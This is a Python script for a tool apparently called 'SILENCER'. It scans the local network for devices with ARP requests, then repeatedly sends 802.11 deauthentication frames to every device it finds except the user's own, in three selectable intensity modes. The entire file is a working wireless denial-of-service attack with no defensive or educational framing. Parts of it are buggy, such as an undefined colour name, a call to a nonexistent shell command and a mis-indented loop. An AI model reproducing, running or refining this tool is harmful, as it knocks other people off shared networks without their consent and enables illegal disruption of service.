#!/usr/bin/python3
from scapy.all import *
import socket
import netifaces
from colorama import Fore, Style
import subprocess
import os
import uuid
import threading
import time
import random

#-------SUDO-CHECK----------------------------------------------------------------------------------

if not 'SUDO_UID' in os.environ.keys():
    print("[!]Try running this program with sudo.")
    exit()

#----------------------------------------------------------------------------------------------------

#------not to cause errors---------------------------------------------------------------------------

silencer = subprocess.run('unlimit', shell = True)

#----------------------------------------------------------------------------------------------------

#-------FUNCTIONS------------------------------------------------------------------------------------

def gateway_ip():
    #getting gateway_ip
    gws = netifaces.gateways()
    gatewayip = list(gws['default'].items())[0][1][0]
    return str(gatewayip)
def macaddr(ip):
    #getting mac address of the target
    arp_request = ARP(pdst = ip)
    ether = Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout = 3, verbose = False)[ 0 ]
    try:
        return result[0][1].hwsrc
    except:
        pass
def your_ip():
    #getting your ip using socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
    except:
        print(Fore.RED + "[!] You have to be connected to a wifi network!")
        exit()
    ip = s.getsockname()[0]
    return str(ip)
def interface():
    output = subprocess.check_output(['route', '-n']).decode('utf-8').split('\n')
    interface = None
    for line in output:
        fields = line.split()
        if len(fields) > 7 and fields[0] == '0.0.0.0':
            interface = fields[7]
            break
    if interface is not None:
        return interface
    else:
        print(Fore.Red + "[!]Unable to determine connected interface.")
        exit()
def scanning(network_ip):
    #looks stupid, right? I'll change it someday
    print(Fore.YELLOW + "=+-+-+IP-+-+-+-+-+-+-MAC-+-+-+-=")
    def main(first,last):
        for search in range(first, last):
            target = f'{network_ip}.{search}'
            if target == your_ip:
                continue
            elif target == gateway:
                continue
            targetmac = macaddr(target)
            if targetmac == None:
                continue
            if targetmac in mac_list:
                continue
            mac_list.append(targetmac)
            print(Fore.YELLOW +'|' + Fore.MAGENTA + f'{target}' + Fore.YELLOW +'|' + Fore.MAGENTA + f'{targetmac}' + Fore.YELLOW + '|')
    for x in range(0,4):
        thread1 = threading.Thread(target=main, args=(0,3))
        thread2 = threading.Thread(target=main, args=(3,6))
        thread3 = threading.Thread(target=main, args=(6,9))
        thread4 = threading.Thread(target=main, args=(9,12))
        thread5 = threading.Thread(target=main, args=(12,15))
        thread6 = threading.Thread(target=main, args=(15,18))
        thread7 = threading.Thread(target=main, args=(18,24))
        thread1.start()
        thread2.start()
        thread3.start()
        thread4.start()
        thread5.start()
        thread6.start()
        thread7.start()
def fuckem(victim,gatewaymac,how_agressive):
        #sending deauth packets using scapy modules
        packet = RadioTap( )/Dot11(addr1 = victim,addr2 = gatewaymac,addr3 = gatewaymac)/Dot11Deauth()
        sendp(packet, inter = 0, count = how_agressive, iface = iface, verbose=False)

#----------------------------------------------------------------------------------------------------



#-------VARS-----------------------------------------------------------------------------------------

iface = interface()
yourip = your_ip()
gateway = gateway_ip()
gatewaymac = macaddr(gateway)
network_ip = gateway[:len(gateway) - 2]
yourmac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
mac_list = []
random_color = [Fore.GREEN,Fore.YELLOW,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.WHITE]
x = 0 #not to overload your PC

#----------------------------------------------------------------------------------------------------


#-------DISPLAY--------------------------------------------------------------------------------------
clear = subprocess.run('clear', shell = True)
print(Fore.MAGENTA + "▒█▀▀▀█ ▀█▀ ▒█░░░ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀█\n"
      "░▀▀▀▄▄ ▒█░ ▒█░░░ ▒█▀▀▀ ▒█▒█▒█ ▒█░░░ ▒█▀▀▀ ▒█▄▄▀\n"
      "▒█▄▄▄█ ▄█▄ ▒█▄▄█ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄█ ▒█▄▄▄ ▒█░▒█")


print(Fore.YELLOW + "— — — — — — — — — — — — — — — — — — — — — — — — — ")
print(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "Your IP: " + yourip)
print(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "Your gateway IP: " + str(gateway))
print(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "Your interface: " + iface)
if gatewaymac == None:
    print(Fore.RED + "[!]Error. Try to reconnect to the network")
    exit()
print(Fore.YELLOW + "— — — — — — — — — — — — — — — — — — — — — —— — — ")
print(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "Getting mac addresses of all network users... \n" + Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "It takes 20 seconds")
#----------------------------------------------------------------------------------------------------

interface()
#----MAIN--------------------------------------------------------------------------------------------

scanning(network_ip)
time.sleep(20)
print(Fore.YELLOW + "=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-=")
print(Fore.YELLOW + "— — — — — — — — — — — — — — — — — — — — — — —— — ")
mode = int(input(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA + ']' + "Select mode:\n" + Fore.WHITE + "[1] - light\n[2] - normal \n[3] - agressive(not recommended)\n" + Fore.MAGENTA + "[" + Fore.YELLOW + '>' + Fore.MAGENTA + ']'))
#checking if mac list is empty
if mac_list:
    pass
else:
    print(Fore.RED +"[!]It looks like no users were found. Try to restart the program\n")
    exit()
print(random.choice(random_color) + Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "De-authenticating all network users except you...\n" + Fore.RED + "[*]Ctrl + Z to stop and exit" + Fore.GREEN)
if mode == 1:
    amount = 1000
    while True:
        for victim in mac_list:
            print(random.choice(random_color) + '\r', victim, end='', flush=True)
            fuckem(victim,gatewaymac,amount)

elif mode == 2:
    amount = 1200
    for victim in mac_list:
        thread = threading.Thread(target=fuckem, args=(victim,gatewaymac,amount))
        thread.start()
    while True:
         for listing in mac_list:
             print(random.choice(random_color) + '\r', victim, end='', flush=True)
elif mode == 3:
    amount = 1000
    while True:
        for victim in mac_list:
            if x == 100:
                x = 0
                time.sleep(10)
        print(random.choice(random_color) + '\r', victim, end='', flush=True)
        thread = threading.Thread(target=fuckem, args=(victim,gatewaymac,amount))
        thread.start()
        x += 1


#----------------------------------------------------------------------------------------------------


